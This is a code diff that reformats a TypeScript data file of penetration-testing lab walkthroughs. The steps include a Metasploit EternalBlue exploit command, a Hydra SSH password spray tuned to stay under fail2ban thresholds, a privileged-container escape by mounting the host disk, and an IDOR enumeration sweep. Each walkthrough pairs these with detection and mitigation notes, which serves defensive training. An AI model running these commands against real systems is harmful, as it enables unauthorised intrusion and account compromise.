-      { title: "Exploit in Metasploit",
-        command: "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.20; run'",
-        expectedOutput: "[+] 10.10.10.20:445 - Meterpreter session 1 opened" },
+      {
+        title: "Exploit in Metasploit",
+        command:
+          "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.20; run'",
+        expectedOutput: "[+] 10.10.10.20:445 - Meterpreter session 1 opened",
+      },
     ],
     successCriteria: "SYSTEM shell on the lab VM.",
     detectionSummary: "SMBv1 traffic + specific 'FEA' patterns; EDR signatures for EternalBlue.",
@@ -1115,12 +1097,15 @@ export const WALKTHROUGHS: Walkthrough[] = [
     legalNote: LAB_NOTE,
     toolSlugs: ["hydra"],
     steps: [
-      { title: "Spray one password",
+      {
+        title: "Spray one password",
         command: "hydra -L users.txt -p 'Winter2024!' -t 2 -W 5 ssh://10.10.10.30",
-        observation: "One thread, five-second wait to stay under fail2ban thresholds." },
+        observation: "One thread, five-second wait to stay under fail2ban thresholds.",
+      },
     ],
     successCriteria: "Valid credential pair discovered without triggering lockout.",
-    detectionSummary: "Many failed logins for many users from a single source; fail2ban / SIEM correlation.",
+    detectionSummary:
+      "Many failed logins for many users from a single source; fail2ban / SIEM correlation.",
     mitigationSummary: "MFA, disable password auth, key-only + short-lived certificates.",
   },
   {
@@ -1135,13 +1120,20 @@ export const WALKTHROUGHS: Walkthrough[] = [
     toolSlugs: ["nsenter"],
     steps: [
       { title: "Confirm privileged", command: "capsh --print | grep cap_sys_admin" },
-      { title: "Mount the host disk",
-        command: "mkdir /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host" },
-      { title: "Write a root-owned SSH key or scheduled task on the host — DO NOT do this outside your lab." },
+      {
+        title: "Mount the host disk",
+        command: "mkdir /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host",
+      },
+      {
+        title:
+          "Write a root-owned SSH key or scheduled task on the host — DO NOT do this outside your lab.",
+      },
     ],
     successCriteria: "Read/write access to host filesystem from inside the container.",
-    detectionSummary: "Falco rules on mount syscalls from containers; audit for --privileged flag in orchestration.",
-    mitigationSummary: "Never run --privileged; drop capabilities; use user namespaces; enforce PodSecurity / OPA.",
+    detectionSummary:
+      "Falco rules on mount syscalls from containers; audit for --privileged flag in orchestration.",
+    mitigationSummary:
+      "Never run --privileged; drop capabilities; use user namespaces; enforce PodSecurity / OPA.",
   },
   {
     slug: "s3-public-bucket",
@@ -1154,20 +1146,22 @@ export const WALKTHROUGHS: Walkthrough[] = [
     legalNote: LAB_NOTE,
     toolSlugs: ["awscli"],
     steps: [
-      { title: "Anonymous ls",
-        command: "aws s3 ls s3://lab-bucket --no-sign-request" },
-      { title: "Check bucket ACL",
-        command: "aws s3api get-bucket-acl --bucket lab-bucket --no-sign-request" },
+      { title: "Anonymous ls", command: "aws s3 ls s3://lab-bucket --no-sign-request" },
+      {
+        title: "Check bucket ACL",
+        command: "aws s3api get-bucket-acl --bucket lab-bucket --no-sign-request",
+      },
     ],
-    successCriteria: "Documented exact permissions granted to anonymous principals — no data downloaded.",
+    successCriteria:
+      "Documented exact permissions granted to anonymous principals — no data downloaded.",
     detectionSummary: "CloudTrail 'AnonymousUser' calls; unusual List/Get spikes.",
-    mitigationSummary: "Block Public Access at account level; least-privilege bucket policy; encryption + logging.",
+    mitigationSummary:
+      "Block Public Access at account level; least-privilege bucket policy; encryption + logging.",
   },
   {
     slug: "burp-authz-test",
     title: "Business-logic authorization test (IDOR / BOLA)",
-    scenario:
-      "Two lab accounts. Verify whether user A can view user B's data by tampering IDs.",
+    scenario: "Two lab accounts. Verify whether user A can view user B's data by tampering IDs.",
     labSetup: "Any multi-tenant lab app with numeric object IDs.",
     duration: "20 minutes",
     difficulty: "beginner",
@@ -1175,20 +1169,24 @@ export const WALKTHROUGHS: Walkthrough[] = [
     toolSlugs: ["burpsuite-community"],
     steps: [
       { title: "Baseline as user A", command: "# capture GET /api/orders/1001 in Burp" },
-      { title: "Swap ID to user B's",
+      {
+        title: "Swap ID to user B's",
         command: "# repeater: change 1001 -> 1002, resend",
-        observation: "200 with B's data == IDOR." },
-      { title: "Automate the sweep",
-        command: "ffuf -u 'http://app.lab.local/api/orders/FUZZ' -w ids.txt -H 'Cookie: session=A' -mc 200" },
+        observation: "200 with B's data == IDOR.",
+      },
+      {
+        title: "Automate the sweep",
+        command:
+          "ffuf -u 'http://app.lab.local/api/orders/FUZZ' -w ids.txt -H 'Cookie: session=A' -mc 200",
+      },
     ],
     successCriteria: "Confirmed cross-tenant read with evidence and impact.",
     detectionSummary: "One session enumerating consecutive IDs across owners.",
-    mitigationSummary: "Server-side authz check on every object read; use unguessable IDs; add rate limits.",
+    mitigationSummary:
+      "Server-side authz check on every object read; use unguessable IDs; add rate limits.",
   },
 ];
 
-export const walkthroughBySlug = (slug: string) =>
-  WALKTHROUGHS.find((w) => w.slug === slug);
+export const walkthroughBySlug = (slug: string) => WALKTHROUGHS.find((w) => w.slug === slug);
 
-export const hasWalkthrough = (slug: string) =>
-  WALKTHROUGHS.some((w) => w.slug === slug);
+export const hasWalkthrough = (slug: string) => WALKTHROUGHS.some((w) => w.slug === slug);
